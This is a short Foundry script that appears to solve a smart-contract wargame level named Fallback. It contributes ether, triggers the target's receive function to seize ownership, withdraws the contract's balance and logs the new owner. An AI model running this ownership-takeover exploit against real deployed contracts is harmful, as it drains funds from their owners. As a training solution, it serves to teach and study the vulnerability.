// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {IFallback} from "../src/interfaces/IFallback.sol";

contract FallbackScript is Script {
    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address instance = vm.envAddress("INSTANCE_ADDRESS");

        IFallback target = IFallback(instance);

        vm.startBroadcast(privateKey);

        // Become a contributor.
        target.contribute{value: 0.0001 ether}();

        // Trigger the vulnerable receive/fallback mechanism.
        (bool success,) = payable(instance).call{value: 1 wei}("");
        require(success, "Fallback call failed");

        // Withdraw the contract balance.
        target.withdraw();

        vm.stopBroadcast();

        console2.log("New owner:", target.owner());
    }
}
